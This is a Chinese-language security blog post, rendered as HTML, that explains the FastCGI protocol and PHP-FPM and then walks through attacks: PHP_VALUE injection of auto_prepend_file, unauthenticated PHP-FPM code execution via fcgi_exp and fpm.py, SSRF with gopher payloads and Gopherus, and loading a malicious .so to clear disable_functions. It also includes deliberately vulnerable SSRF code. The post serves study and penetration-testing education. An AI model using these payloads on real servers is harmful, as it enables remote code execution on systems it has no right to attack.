@@ -1,0 +1,657 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>Bypass Disable Functions（二）—— Fastcgi 协议分析与 PHP-FPM 攻击方法 - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Bypass Disable Functions（二）—— Fastcgi 协议分析与 PHP-FPM 攻击方法">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-14 15:43" pubdate>
+        August 14, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      37
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Bypass Disable Functions（二）—— Fastcgi 协议分析与 PHP-FPM 攻击方法</h1>
+            
+            <div class="markdown-body">
+              <h3 id="条件"><a class="header-anchor" href="#条件">🍭</a>条件</h3>
+<p>Linux 操作系统 PHP-FPM 存在可写的目录，需要上传<code>.so</code>文件</p>
+<h3 id="原理"><a class="header-anchor" href="#原理">🍭</a>原理</h3>
+<h4 id="Fast-CGI"><a class="header-anchor" href="#Fast-CGI">🍭</a>Fast-CGI</h4>
+<p>CGI解决了Web服务器与PHP解释器的通信问题，但是Web服务器每收到一个请求，都会去Fork一个CGI进程，请求结束再kill掉这个进程，很浪费资源。于是，便出现了CGI的改良版本——Fast-CGI。Fast-CGI每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求，提高效率。</p>
+<h4 id="浏览器处理静态-动态网页过程"><a class="header-anchor" href="#浏览器处理静态-动态网页过程">🍭</a>浏览器处理静态/动态网页过程</h4>
+<h5 id="静态"><a class="header-anchor" href="#静态">🍭</a>静态</h5>
+<p><img src="/2021/08/14/ff2/1.png" srcset="/img/loading.gif" alt="1"></p>
+<h5 id="动态"><a class="header-anchor" href="#动态">🍭</a>动态</h5>
+<p><img src="/2021/08/14/ff2/3.png" srcset="/img/loading.gif" alt="3"></p>
+<h4 id="Fast-CGI-Record"><a class="header-anchor" href="#Fast-CGI-Record">🍭</a>Fast-CGI Record</h4>
+<p>HTTP协议是<strong>浏览器和服务器</strong>中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。类比HTTP，CGI协议是<strong>Web服务器和解释器</strong>进行数据交换的协议，它由多条record组成，每一条record都和HTTP一样，也由header和body组成，Web服务器将这二者按照CGI规则封装好发送给解释器，解释器解码之后拿到具体数据进行操作，得到结果之后再次封装好返回给Web服务器。</p>
+<p>record的header头部固定的是8个字节，body是由头中的contentLength指定：</p>
+<pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span>
+<span class="hljs-class">&#123;</span>
+<span class="hljs-comment">/*HEAD*/</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> version;              <span class="hljs-comment">//版本</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> type;                 <span class="hljs-comment">//类型</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> requestIdB1;          <span class="hljs-comment">//id</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> requestIdB0;          
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentLengthB1;      <span class="hljs-comment">//body大小</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentLengthB0;
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> paddingLength;        <span class="hljs-comment">//额外大小</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> reserved;       
+<span class="hljs-comment">/*BODY*/</span>
+   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentData[contentLength];<span class="hljs-comment">//主要内容</span>
+   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> paddingData[paddingLength];<span class="hljs-comment">//额外内容</span>
+&#125;FCGI_Record;</code></pre>
+<p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示body的大小。body体就是语言端解析了fastcgi头以后，拿到<code>contentLength</code>后在TCP流里读取大小等于<code>contentLength</code>的数据。Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。一个fastcgi record结构最大支持的body大小是<code>2^16</code>，65536字节。</p>
+<h4 id="Fastcgi-Type"><a class="header-anchor" href="#Fastcgi-Type">🍭</a>Fastcgi Type</h4>
+<p><code>type</code> 指定该 Record 的作用。Fastcgi 中一个 Record 的大小有限且作用单一，所以我们需要在一个TCP流里传输多个 Record，通过 <code>type</code> 来标志每个 Record 的作用，并用 <code>requestId</code> 来标识同一次请求的id。每次请求，会有多个 Record，<code>requestId</code> 是相同的。</p>
+<p>主要的几种 <code>type</code>：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">type值</th>
+<th style="text-align:left">具体含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:left">在与php-fpm建立连接之后发送的第一个消息中的type值就得为1，用来表明此消息为请求开始的第一个消息</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:left">异常断开与php-fpm的交互</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td style="text-align:left">在与php-fpm交互中所发的最后一个消息中type值为此，以表明交互的正常结束</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:left">在交互过程中给php-fpm传递环境变量时，将type设为此，以表明消息中包含的数据为某个name-value对</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td style="text-align:left">Web服务器将从浏览器接收到的POST请求数据（表单提交等）以消息的形式发给php-fpm，这种消息的type就得设为5</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td style="text-align:left">php-fpm给Web服务器回的正常响应消息的type就设为6</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td style="text-align:left">php-fpm给Web服务器回的错误响应设为7</td>
+</tr>
+</tbody>
+</table>
+<p>服务器中间件和后端语言通信，第一个数据包就是 <code>type</code> 为1的 Record，后续互相交流，发送 <code>type</code> 为4、5、6、7的 Record，结束时发送 <code>type</code> 为2、3的 Record。当后端语言接收到一个 <code>type</code> 为4的 Record 后，就会把这个 Record 的 Body 按照对应的结构解析成 key-value 对，规则如下：</p>
+<ul>
+<li>key、value均小于128字节，用 <code>FCGI_NameValuePair11</code></li>
+<li>key大于128字节，value小于128字节，用 <code>FCGI_NameValuePair41</code></li>
+<li>key小于128字节，value大于128字节，用 <code>FCGI_NameValuePair14</code></li>
+<li>key、value均大于128字节，用 <code>FCGI_NameValuePair44</code></li>
+</ul>
+<h4 id="PHP-FPM"><a class="header-anchor" href="#PHP-FPM">🍭</a>PHP-FPM</h4>
+<p>FPM是Fastcgi的协议解析器，Web服务器使用CGI协议封装好用户的请求发送给FPM。FPM按照CGI的协议将TCP流解析成真正的数据。</p>
+<p>当用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>时，Nginx会将这个请求变成如下键值对：</p>
+<pre><code class="hljs 1c">&#123;
+    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,
+    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,
+    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,
+    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,
+    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,
+    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,
+    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,
+    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,
+    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,
+    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,
+    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,
+    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,
+    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,
+    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;
+&#125;</code></pre>
+<p>这个数组就是PHP中SERVER数组的一部分，也就是PHP里的环境变量。环境变量的作用不仅是填充_SERVER数组，也是告诉fpm要执行的PHP文件。PHP-FPM拿到Fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code>。如果我们能够控制 <code>SCRIPT_FILENAME</code> 的值，就可以让 PHP-FPM 执行服务器上任意的 PHP 文件了。</p>
+<h3 id="PHP-FPM-任意代码执行"><a class="header-anchor" href="#PHP-FPM-任意代码执行">🍭</a>PHP-FPM 任意代码执行</h3>
+<p>Web 服务器中间件会将用户请求设置成环境变量，并且会出现一个 <code>'SCRIPT_FILENAME': '/var/www/html/index.php'</code> 这样的键值对，即使能够控制这个键值对的值，也只能控制 PHP-FPM 去执行某个已经存在的文件，不能够实现一些恶意代码的执行。并且在 PHP 5.3.9 后来的版本中，PHP 增加了 <code>security.limit_extensions</code> 安全选项，导致只能控制 PHP-FPM 执行一些像 php、php3、php4、php5、php7 这样的文件。但是 PHP 中有两个配置项：</p>
+<ul>
+<li><code>auto_prepend_file</code>：在执行目标文件之前，先包含 <code>auto_prepend_file</code> 中指定的文件。</li>
+<li><code>auto_append_file</code>：在执行完成目标文件后，再包含 <code>auto_append_file</code> 指向的文件。</li>
+</ul>
+<p>假设我们设置 <code>auto_prepend_file</code> 为 <code>php://input</code>，就等于在执行任何 PHP 文件前都要包含一遍 POST 的内容。把需要执行的代码放在 Body 中就能被执行了（需要allow_url_include=on）</p>
+<h5 id="设置-auto-prepend-file-的值"><a class="header-anchor" href="#设置-auto-prepend-file-的值">🍭</a>设置 <code>auto_prepend_file</code> 的值</h5>
+<p>这就涉及到 PHP-FPM 的两个环境变量，<code>PHP_VALUE</code> 和 <code>PHP_ADMIN_VALUE</code>。<code>PHP_VALUE</code> 可以设置模式为 <code>PHP_INI_USER</code> 和 <code>PHP_INI_ALL</code> 的选项，<code>PHP_ADMIN_VALUE</code> 可以设置所有选项。</p>
+<p>传入环境变量：</p>
+<pre><code class="hljs 1c">&#123;
+    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,
+    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,
+    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,
+    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,
+    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,
+    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,
+    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,
+    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,
+    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,
+    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,
+    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,
+    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,
+    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,
+    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;
+    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,
+    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;
+&#125;</code></pre>
+<h3 id="PHP-FPM-未授权访问漏洞"><a class="header-anchor" href="#PHP-FPM-未授权访问漏洞">🍭</a>PHP-FPM 未授权访问漏洞</h3>
+<h5 id="原理-v2"><a class="header-anchor" href="#原理-v2">🍭</a>原理</h5>
+<p>攻击者可以通过 <code>PHP_VALUE</code> 和 <code>PHP_ADMIN_VALUE</code> 这两个环境变量设置 PHP 配置选项 <code>auto_prepend_file</code> 和 <code>allow_url_include</code> ，从而使 PHP-FPM RCE。由于 PHP-FPM 和 Web  服务器中间件是通过网络进行沟通的，越来越多的集群将 PHP-FPM  直接绑定在公网上，所有人都可以对其进行访问。任何人都可以伪装成Web服务器中间件来让 PHP-FPM  执行我们想执行的恶意代码。</p>
+<h5 id="条件-v2"><a class="header-anchor" href="#条件-v2">🍭</a>条件</h5>
+<p>靶机：</p>
+<p>设置监听9000端口来处理nginx的请求，并PHP-FPM 暴露在 0.0.0.0 。</p>
+<pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/7.4/</span>fpm<span class="hljs-regexp">/pool.d/</span>www.conf
+;listen = <span class="hljs-regexp">/run/</span>php/php7.<span class="hljs-number">4</span>-fpm.sock
+listen = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">9000</span></code></pre>
+<p>nginx的配置文件 <code>/etc/nginx/sites-available/default</code> 下相应配置：</p>
+<pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;
+    <span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>; <span class="hljs-comment">#监听80端口，接收http请求</span>
+    <span class="hljs-attribute">server_name</span>  www.example.com; <span class="hljs-comment">#就是网站地址</span>
+    <span class="hljs-attribute">root</span> /var/www/html; <span class="hljs-comment"># 准备存放代码工程的路径</span>
+    <span class="hljs-comment">#路由到网站根目录www.example.com时候的处理</span>
+    <span class="hljs-attribute">location</span> / &#123;
+        <span class="hljs-attribute">index</span> index.php; <span class="hljs-comment">#跳转到www.example.com/index.php</span>
+        <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;
+    &#125;  
+    <span class="hljs-comment">#当请求网站下php文件的时候，反向代理到php-fpm</span>
+    <span class="hljs-attribute">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;
+        <span class="hljs-attribute">fastcgi_split_path_info</span><span class="hljs-regexp"> ^(.+\.php)(/.+)$</span>;
+        <span class="hljs-attribute">fastcgi_pass</span> <span class="hljs-number">0.0.0.0:9000</span>;<span class="hljs-comment">#nginx fastcgi进程监听的IP地址和端口</span>
+        <span class="hljs-comment">#fastcgi_pass unix:/run/php/php7.4-fpm.sock;</span>
+        <span class="hljs-attribute">fastcgi_index</span> index.php;
+        <span class="hljs-attribute">include</span> fastcgi_params;
+    &#125;
+&#125;</code></pre>
+<h5 id="fcgi-exp-go-攻击"><a class="header-anchor" href="#fcgi-exp-go-攻击">🍭</a>fcgi_exp.go 攻击</h5>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/wofeiwo/webcgi-exploits">https://github.com/wofeiwo/webcgi-exploits</a></p>
+<p>直接运行可以看到 fcgi_exp 的使用方法：</p>
+<p><img src="/2021/08/14/ff2/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>命令格式</p>
+<pre><code class="hljs routeros">./fcgi_exp<span class="hljs-built_in"> system </span>192.168.22.82 9000 /var/www/html/index.php <span class="hljs-string">&quot;id&quot;</span></code></pre>
+<ul>
+<li>system：要使用的PHP函数</li>
+<li>192.168.22.82：目标机IP</li>
+<li>9000：目标机 fpm 端口</li>
+<li>/var/www/html/index.php：已知的位于目标机上的PHP文件</li>
+<li>id：要执行的系统命令</li>
+</ul>
+<h5 id="fpm-py攻击"><a class="header-anchor" href="#fpm-py攻击">🍭</a>fpm.py攻击</h5>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
+<p>利用方式</p>
+<pre><code class="hljs php-template"><span class="xml">python fpm.py 192.168.43.82 /var/www/html/index.php -c &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;id&#x27;</span>); <span class="hljs-keyword">exit</span>(); <span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span></code></pre>
+<h3 id="SSRF-中对-FPM-FastCGI-的攻击"><a class="header-anchor" href="#SSRF-中对-FPM-FastCGI-的攻击">🍭</a>SSRF 中对 FPM/FastCGI 的攻击</h3>
+<p>当PHP-FPM 不绑定在 0.0.0.0 上面，而是 127.0.0.1，这样便避免了将 PHP-FPM 暴露在公网上被攻击者访问，但是如果目标主机上存在 SSRF 漏洞的话，我们便可以通过 SSRF 漏洞攻击内网的 PHP-FPM 。</p>
+<p>举个例子：</p>
+<p>当靶机存在 SSRF 漏洞的代码：</p>
+<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+    $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>];
+    $curl = curl_init($url);    
+    <span class="hljs-comment">//第二种初始化curl的方式</span>
+    <span class="hljs-comment">//$curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_GET[&#x27;url&#x27;]); </span>
+
+    <span class="hljs-comment">/*进行curl配置*/</span>
+    curl_setopt($curl, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">// 不输出HTTP头</span>
+    $responseText = curl_exec($curl);
+
+    <span class="hljs-keyword">echo</span> $responseText;
+    curl_close($curl);
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>此时通过 SSRF 可以探测到目标主机上 9000 端口上运行的 php-fpm。虽然 php-fpm 没有暴露在公网上，但我们可以通过 SSRF 漏洞配合 Gopher 协议打内网的 php-fpm。</p>
+<h4 id="利用-fcgi-exp-攻击"><a class="header-anchor" href="#利用-fcgi-exp-攻击">🍭</a>利用 fcgi_exp 攻击</h4>
+<p>仍可以利用 上面讲到的fcgi_exp 攻击，但此时不能再用上面的payload，因为在配置端口监听的时候，仅允许监听在127.0.0.1，不存在 php-fpm 未授权访问。我们要通过 SSRF 来从目标机内部攻击 9000 端口：</p>
+<p>使用 <code>nc -lvvp 1234 &gt; fcg_exp.txt</code> 监听1234 端口接收 payload：</p>
+<p><img src="/2021/08/14/ff2/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>另外开启一个终端发送 payload：</p>
+<pre><code class="hljs routeros">./fcgi_exp<span class="hljs-built_in"> system </span>127.0.0.1 1234 /var/www/html/index.php <span class="hljs-string">&quot;id&quot;</span></code></pre>
+<p><img src="/2021/08/14/ff2/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>这里攻击的端口是前面监听的端口，目的是将payload发送到这个端口；得到了一个fcg_exp.txt的文件：</p>
+<p><img src="/2021/08/14/ff2/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>有部分不可见字符，url编码：</p>
+<pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> urllib.parse import <span class="hljs-literal">quote</span>, unquote, urlencode
+
+<span class="hljs-built_in">file</span> = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;fcg_exp.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)
+payload = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>()
+print(<span class="hljs-string">&quot;gopher://127.0.0.1:9000/_&quot;</span>+<span class="hljs-literal">quote</span>(payload).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;%2F&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>))</code></pre>
+<p>执行后将payload进行二次url编码（GET进行一次解码，curl也会再进行一次解码）url传参即可RCE。</p>
+<h4 id="利用-Gopherus-攻击"><a class="header-anchor" href="#利用-Gopherus-攻击">🍭</a>利用 Gopherus 攻击</h4>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
+<p><img src="/2021/08/14/ff2/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>工具需要的参数：</p>
+<pre><code class="hljs awk">python gopherus.py --exploit fastcgi
+<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php                 <span class="hljs-comment"># 这里输入的是一个已知存在的php文件</span>
+id                                      <span class="hljs-comment">#要获取的信息</span></code></pre>
+<p><img src="/2021/08/14/ff2/8.png" srcset="/img/loading.gif" alt="8"></p>
+<h3 id="加载恶意-so绕过-Disable-Dunctions实现-RCE"><a class="header-anchor" href="#加载恶意-so绕过-Disable-Dunctions实现-RCE">🍭</a>加载恶意 .so绕过 Disable_Dunctions实现 RCE</h3>
+<p>LD_PRELOAD 绕过 disable_functions 是把我们编译出来的恶意的 .so 文件加载到环境变量中去执行，实现RCE的，LD_PRELOAD 是通过 putenv() 把so文件加载到环境变量中再去调用。那么 Fastcgi 也可以做同样的事，只需要通过 <code>PHP_VALUE</code> 给 php.ini 添加一个 extender 扩展即可</p>
+<pre><code class="hljs lsl">$php_value = <span class="hljs-string">&quot;unserialize_callback_func = system<span class="hljs-subst">\n</span>extension_dir = /tmp<span class="hljs-subst">\n</span>extension = hpdoger.so<span class="hljs-subst">\n</span>disable_classes = <span class="hljs-subst">\n</span>disable_functions = <span class="hljs-subst">\n</span>allow_url_include = On<span class="hljs-subst">\n</span>open_basedir = /<span class="hljs-subst">\n</span>auto_prepend_file = &quot;</span>;</code></pre>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/05/15/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">https://whoamianony.top/2021/05/15/Web安全/浅入深出 Fastcgi 协议分析与 PHP-FPM 攻击方法/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/bypass/">bypass</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/16/ff3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Bypass Disable Functions (三)</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/13/ff/">
+                        <span class="hidden-mobile">Bypass Disable Function（一）</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
